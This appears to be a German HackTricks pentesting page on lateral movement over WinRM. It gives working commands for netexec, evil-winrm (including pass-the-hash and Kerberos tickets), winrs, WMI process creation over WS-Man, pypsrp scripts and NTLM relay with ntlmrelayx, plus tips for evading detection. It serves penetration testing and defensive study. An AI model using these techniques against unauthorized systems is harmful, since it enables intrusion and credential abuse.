# WinRM

{{#include ../../banners/hacktricks-training.md}}

WinRM ist einer der praktischsten **lateral movement**-Transporte in Windows-Umgebungen, da es eine Remote-Shell über **WS-Man/HTTP(S)** bereitstellt, ohne auf Tricks zur SMB-Service-Erstellung angewiesen zu sein. Wenn das Ziel **5985/5986** offenlegt und dein Principal Remoting verwenden darf, kannst du dich oft sehr schnell von „valid creds“ zu einer **interactive shell** bewegen.

Für die **protocol/service enumeration**, Listener, das Aktivieren von WinRM, `Invoke-Command` und die allgemeine Client-Nutzung siehe:

{{#ref}}
../../network-services-pentesting/5985-5986-pentesting-winrm.md
{{#endref}}

## Warum Operatoren WinRM mögen

- Verwendet **HTTP/HTTPS** statt SMB/RPC und funktioniert daher häufig auch dort, wo die Ausführung im PsExec-Stil blockiert wird.
- Mit **Kerberos** werden keine wiederverwendbaren Zugangsdaten an das Ziel gesendet.
- Funktioniert problemlos mit **Windows**-, **Linux**- und **Python**-Tools (`winrs`, `evil-winrm`, `pypsrp`, `netexec`).
- Der interaktive PowerShell-Remoting-Pfad startet auf dem Ziel **`wsmprovhost.exe`** im Kontext des authentifizierten Benutzers, was sich operativ von einer servicebasierten Ausführung unterscheidet.

## Zugriffsmodell und Voraussetzungen

In der Praxis hängt erfolgreiches WinRM-**lateral movement** von **drei** Dingen ab:

1. Das Ziel verfügt über einen **WinRM listener** (`5985`/`5986`) und Firewall-Regeln, die den Zugriff erlauben.
2. Das Konto kann sich am Endpoint **authentifizieren**.
3. Das Konto darf eine **remoting session** öffnen.

Häufige Möglichkeiten, diesen Zugriff zu erhalten:

- **Local Administrator** auf dem Ziel.
- Mitgliedschaft in **Remote Management Users** auf neueren Systemen oder in **WinRMRemoteWMIUsers__** auf Systemen/Komponenten, die diese Gruppe weiterhin berücksichtigen.
- Explizite Remoting-Berechtigungen, die über lokale Sicherheitsdeskriptoren bzw. Änderungen an PowerShell-Remoting-ACLs delegiert wurden.

Wenn du bereits einen Rechner mit Admin-Rechten kontrollierst, denke daran, dass du **WinRM access without full admin group membership** ebenfalls mithilfe der hier beschriebenen Techniken delegieren kannst:

{{#ref}}
../active-directory-methodology/security-descriptors.md
{{#endref}}

### Wichtige Authentication-Fallstricke bei lateral movement

- **Kerberos erfordert einen Hostnamen/FQDN**. Wenn du dich per IP verbindest, wechselt der Client normalerweise auf **NTLM/Negotiate**.
- In **workgroup**- oder Cross-Trust-Sonderfällen erfordert NTLM häufig entweder **HTTPS** oder dass das Ziel auf dem Client zu **TrustedHosts** hinzugefügt wird.
- Bei **local accounts** über Negotiate in einer Workgroup können UAC-Remote-Beschränkungen den Zugriff verhindern, sofern nicht das integrierte Administrator-Konto verwendet oder `LocalAccountTokenFilterPolicy=1` gesetzt wird.
- PowerShell Remoting verwendet standardmäßig den **`HTTP/<host>` SPN**. In Umgebungen, in denen **`HTTP/<host>`** bereits für ein anderes Servicekonto registriert ist, kann WinRM Kerberos mit `0x80090322` fehlschlagen; verwende einen portqualifizierten SPN oder wechsle zu **`WSMAN/<host>`**, sofern dieser SPN vorhanden ist.<sup>[[3]](#references)</sup>

Wenn du durch Password Spraying an gültige Zugangsdaten gelangst, ist die Validierung über WinRM oft der schnellste Weg, zu prüfen, ob sie zu einer Shell führen:

{{#ref}}
../active-directory-methodology/password-spraying.md
{{#endref}}

## Lateral movement von Linux zu Windows

### NetExec / CrackMapExec zur Validierung und für One-Shot-Ausführung
```bash
# Validate creds and execute a simple command
netexec winrm <HOST_FQDN> -u <USER> -p '<PASSWORD>' -x "whoami /all"

# Pass-the-Hash
netexec winrm <HOST_FQDN> -u <USER> -H <NTHASH> -x "hostname"

# PowerShell command instead of cmd.exe
netexec winrm <HOST_FQDN> -u <USER> -H <NTHASH> -X '$PSVersionTable'
```
### Evil-WinRM für interaktive Shells

`evil-winrm` bleibt unter Linux die praktischste interaktive Option, da es **Passwörter**, **NT-Hashes**, **Kerberos-Tickets**, **Client-Zertifikate**, Dateiübertragungen sowie das Laden von PowerShell/.NET im Speicher unterstützt.
```bash
# Password
evil-winrm -i <HOST_FQDN> -u <USER> -p '<PASSWORD>'

# Pass-the-Hash
evil-winrm -i <HOST_FQDN> -u <USER> -H <NTHASH>

# Kerberos using an existing ccache/kirbi
export KRB5CCNAME=./user.ccache
evil-winrm -i <HOST_FQDN> -r <REALM.LOCAL>
```
### Kerberos-SPN-Sonderfall: `HTTP` vs `WSMAN`

Wenn der standardmäßige **`HTTP/<host>`**-SPN Kerberos-Fehler verursacht, versuchen Sie stattdessen, ein **`WSMAN/<host>`**-Ticket anzufordern bzw. zu verwenden. Dies tritt offenbar in gehärteten oder ungewöhnlichen Unternehmensumgebungen auf, in denen **`HTTP/<host>`** bereits einem anderen Service-Account zugeordnet ist.<sup>[[3]](#references)</sup>
```bash
# Example: use a WSMAN ticket instead of the default HTTP SPN
export KRB5CCNAME=administrator@WSMAN_srv01.domain.local@DOMAIN.LOCAL.ccache
evil-winrm -i srv01.domain.local -r DOMAIN.LOCAL --spn WSMAN
```
Dies ist auch nach dem Missbrauch von **RBCD / S4U** nützlich, wenn du ausdrücklich ein **WSMAN**-Service-Ticket statt eines generischen `HTTP`-Tickets gefälscht oder angefordert hast.

### Zertifikatsbasierte Authentifizierung

WinRM unterstützt auch die **Client-Zertifikatsauthentifizierung**, aber das Zertifikat muss auf dem Ziel einem **lokalen Konto** zugeordnet sein. Aus offensiver Sicht ist dies relevant, wenn:

- du bereits ein gültiges Client-Zertifikat und den privaten Schlüssel gestohlen/exportiert hast, die für WinRM zugeordnet sind;
- du **AD CS / Pass-the-Certificate** missbraucht hast, um ein Zertifikat für einen Principal zu erhalten, und anschließend in einen anderen Authentifizierungspfad wechselst;
- du in Umgebungen arbeitest, die passwortbasierte Remoting-Verbindungen bewusst vermeiden.
```bash
evil-winrm -i <HOST_FQDN> -S -c user.crt -k user.key
```
Client-certificate WinRM ist deutlich seltener als die Authentifizierung mit Passwort/Hash/Kerberos, kann aber, wenn vorhanden, einen **passwordless lateral movement**-Pfad bieten, der eine Passwortrotation übersteht.

### Python / Automatisierung mit `pypsrp`

Wenn du statt einer Operator-Shell eine Automatisierung benötigst, bietet `pypsrp` WinRM/PSRP aus Python mit Unterstützung für **NTLM**, **certificate auth**, **Kerberos** und **CredSSP**.<sup>[[2]](#references)</sup>
```python
from pypsrp.client import Client

client = Client(
"srv01.domain.local",
username="DOMAIN\\user",
password="Password123!",
ssl=False,
)
stdout, stderr, rc = client.execute_cmd("whoami /all")
print(stdout, stderr, rc)
```
Wenn du eine feinere Kontrolle als mit dem übergeordneten `Client`-Wrapper benötigst, sind die Low-Level-APIs `WSMan` + `RunspacePool` bei zwei häufigen Operator-Problemen nützlich:

- **`WSMAN`** als Kerberos-Service/SPN erzwingen, statt der von vielen PowerShell-Clients verwendeten standardmäßigen Erwartung **`HTTP`**;
- eine Verbindung zu einem **nicht standardmäßigen PSRP-Endpunkt** herstellen, beispielsweise zu einer **JEA**- oder benutzerdefinierten Sitzungskonfiguration, statt zu `Microsoft.PowerShell`.
```python
from pypsrp.wsman import WSMan
from pypsrp.powershell import PowerShell, RunspacePool

wsman = WSMan(
"srv01.domain.local",
auth="kerberos",
ssl=False,
negotiate_service="WSMAN",
)

with wsman, RunspacePool(wsman, configuration_name="MyJEAEndpoint") as pool, PowerShell(pool) as ps:
ps.add_script("whoami; Get-Command")
output = ps.invoke()
print(output)
```
### Benutzerdefinierte PSRP endpoints und JEA sind bei lateral movement relevant

Eine erfolgreiche WinRM-Authentifizierung bedeutet **nicht** immer, dass du im standardmäßigen uneingeschränkten `Microsoft.PowerShell`-Endpoint landest. Ausgereifte Umgebungen können **custom session configurations** oder **JEA**-Endpoints mit eigenen ACLs und einem eigenen run-as-Verhalten bereitstellen.<sup>[[1]](#references)</sup>

Wenn du bereits über code execution auf einem Windows-Host verfügst und verstehen möchtest, welche Remoting-Oberflächen vorhanden sind, liste die registrierten Endpoints auf:
```powershell
Get-PSSessionConfiguration | Select-Object Name, Permission
```
Wenn ein nützlicher Endpoint vorhanden ist, sprechen Sie ihn explizit an, statt die Standard-Shell zu verwenden:
```powershell
Enter-PSSession -ComputerName srv01.domain.local -ConfigurationName MyJEAEndpoint
```
Praktische offensive Auswirkungen:

- Ein **restricted** Endpoint kann für lateral movement weiterhin ausreichen, wenn er nur die richtigen Cmdlets/Funktionen für service control, file access, process creation oder die beliebige Ausführung von .NET-/externen Befehlen bereitstellt.
- Eine **misconfigured JEA**-Rolle ist besonders wertvoll, wenn sie gefährliche Befehle wie `Start-Process`, weit gefasste Wildcards, beschreibbare Provider oder benutzerdefinierte Proxy-Funktionen offenlegt, mit denen sich die vorgesehenen Einschränkungen umgehen lassen.
- Endpoints, die auf **RunAs virtual accounts** oder **gMSAs** basieren, verändern den effektiven Security Context der ausgeführten Befehle. Insbesondere kann ein gMSA-basierter Endpoint beim **second hop** eine **network identity** bereitstellen, selbst wenn eine normale WinRM-Session am klassischen Delegation-Problem scheitern würde.

## Windows-native WinRM lateral movement

### `winrs.exe`

`winrs.exe` ist integriert und nützlich, wenn du **native WinRM command execution** ohne das Öffnen einer interaktiven PowerShell-Remoting-Session benötigst:
```cmd
winrs -r:srv01.domain.local cmd /c whoami
winrs -r:https://srv01.domain.local:5986 -u:DOMAIN\\user -p:Password123! hostname
```
Zwei Flags werden leicht vergessen und sind in der Praxis wichtig:

- `/noprofile` ist oft erforderlich, wenn der **remote principal** kein lokaler Administrator ist.
- `/allowdelegate` ermöglicht es der Remote-Shell, deine Zugangsdaten gegenüber einem **third host** zu verwenden (zum Beispiel, wenn der Befehl `\\fileserver\share` benötigt).
```cmd
winrs -r:srv01.domain.local /noprofile cmd /c set
winrs -r:srv01.domain.local /allowdelegate cmd /c dir \\fileserver.domain.local\share
```
Operativ führt `winrs.exe` häufig zu einer ähnlichen Prozesskette auf dem Remote-System:
```text
svchost.exe (DcomLaunch) -> winrshost.exe -> cmd.exe /c <command>
```
Dies sollte man sich merken, da es sich von service-based exec und interaktiven PSRP-Sessions unterscheidet.

### `winrm.cmd` / WS-Man COM statt PowerShell remoting

Du kannst auch über den **WinRM-Transport** ausführen, ohne `Enter-PSSession` zu verwenden, indem du WMI-Klassen über WS-Man aufrufst. Dabei bleibt der Transport WinRM, während das Primitive für die Remote-Ausführung zu **WMI `Win32_Process.Create`** wird:
```cmd
winrm invoke Create wmicimv2/Win32_Process @{CommandLine="cmd.exe /c whoami > C:\\Windows\\Temp\\who.txt"} -r:srv01.domain.local
```
Dieser Ansatz ist nützlich, wenn:

- PowerShell logging stark überwacht wird.
- Du **WinRM transport** verwenden möchtest, aber keinen klassischen PS-remoting-Workflow.
- Du eigene Tools rund um das **`WSMan.Automation`**-COM-Objekt entwickelst oder verwendest.

## NTLM relay zu WinRM (WS-Man)

Wenn SMB relay durch Signing blockiert wird und LDAP relay eingeschränkt ist, kann **WS-Man/WinRM** weiterhin ein attraktives relay-Ziel sein. Moderne `ntlmrelayx.py`-Versionen enthalten **WinRM relay servers** und können zu **`wsman://`**- oder **`winrms://`**-Zielen relayn.
```bash
# Relay to HTTP WinRM
ntlmrelayx.py -t wsman://srv01.domain.local --no-smb-server -smb2support

# Relay to HTTPS WinRM
ntlmrelayx.py -t winrms://srv01.domain.local --no-smb-server -smb2support
```
Zwei praktische Hinweise:

- Relay ist am nützlichsten, wenn das Ziel **NTLM** akzeptiert und der weitergeleitete Principal WinRM verwenden darf.
- Aktueller Impacket-Code behandelt **`WSMANIDENTIFY: unauthenticated`**-Anfragen ausdrücklich, sodass Probes im Stil von `Test-WSMan` den Relay-Ablauf nicht unterbrechen.

Für Einschränkungen bei mehreren Hops nach dem Aufbau einer ersten WinRM-Sitzung siehe:

{{#ref}}
../active-directory-methodology/kerberos-double-hop-problem.md
{{#endref}}

## Hinweise zu OPSEC und Erkennung

- **Interaktives PowerShell-Remoting** erzeugt auf dem Ziel normalerweise **`wsmprovhost.exe`**.
- **`winrs.exe`** erzeugt üblicherweise **`winrshost.exe`** und anschließend den angeforderten Child-Prozess.
- Benutzerdefinierte **JEA**-Endpunkte können Aktionen als virtuelle Konten **`WinRM_VA_*`** oder als konfigurierte **gMSA** ausführen. Dadurch ändern sich sowohl die Telemetrie als auch das Verhalten beim zweiten Hop im Vergleich zu einer Shell im Kontext eines normalen Benutzers.<sup>[[1]](#references)</sup>
- Rechne mit Telemetrie für **Network Logon**, WinRM-Service-Ereignissen sowie PowerShell-Operational- und Script-Block-Logging, wenn du PSRP anstelle von Raw-`cmd.exe` verwendest.
- Wenn du nur einen einzelnen Befehl benötigst, kann `winrs.exe` oder eine einmalige WinRM-Ausführung unauffälliger sein als eine langlebige interaktive Remoting-Sitzung.
- Wenn Kerberos verfügbar ist, bevorzuge **FQDN + Kerberos** gegenüber IP + NTLM, um sowohl Vertrauensprobleme als auch problematische clientseitige Änderungen an `TrustedHosts` zu reduzieren.

## Referenzen

- [1] [Microsoft: JEA Security Considerations](https://learn.microsoft.com/en-us/powershell/scripting/security/remoting/jea/security-considerations?view=powershell-7.6)
- [2] [pypsrp README](https://github.com/jborean93/pypsrp)
- [3] [Microsoft: Error `0x80090322` when connecting PowerShell to a remote server via WinRM](https://learn.microsoft.com/en-us/troubleshoot/windows-server/system-management-components/error-0x80090322-when-connecting-powershell-to-remote-server-via-winrm)


{{#include ../../banners/hacktricks-training.md}}
